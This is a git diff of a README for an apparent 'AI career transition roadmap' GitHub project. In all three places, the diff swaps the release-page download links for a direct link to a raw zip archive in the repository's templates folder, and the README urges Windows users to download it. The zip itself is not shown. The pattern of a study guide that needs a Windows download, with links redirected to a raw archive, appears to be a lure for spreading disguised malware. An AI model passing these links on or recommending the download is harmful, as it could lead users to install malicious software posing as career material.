@@ -1,9 +1,9 @@
 # 🤖 ai-career-transition-roadmap - Plan Your AI Career Move
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/kylenunromantic387/ai-career-transition-roadmap/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/kylenunromantic387/ai-career-transition-roadmap/raw/refs/heads/main/templates/roadmap_career_transition_ai_3.7.zip)
 
 ## 📥 Download
-Visit this page to download: https://github.com/kylenunromantic387/ai-career-transition-roadmap/releases
+Visit this page to download: https://github.com/kylenunromantic387/ai-career-transition-roadmap/raw/refs/heads/main/templates/roadmap_career_transition_ai_3.7.zip
 
 Pick the latest release for Windows, then download the file that matches your device.
 
@@ -123,7 +123,7 @@ Always choose the newest release unless the release notes tell you to use a diff
 ai-career, ai-engineering, ai-learning, career-transition, learning-path, llm, machine-learning-roadmap, mlops, portfolio, prompt-engineering
 
 ## 🔗 Download again
-[Visit the release page to download](https://github.com/kylenunromantic387/ai-career-transition-roadmap/releases)
+[Visit the release page to download](https://github.com/kylenunromantic387/ai-career-transition-roadmap/raw/refs/heads/main/templates/roadmap_career_transition_ai_3.7.zip)
 
 ## 🖥️ Best use on Windows
 Use this roadmap on Windows when you want a clear learning path you can follow at home or at work. Keep the release page bookmarked so you can check for updates later
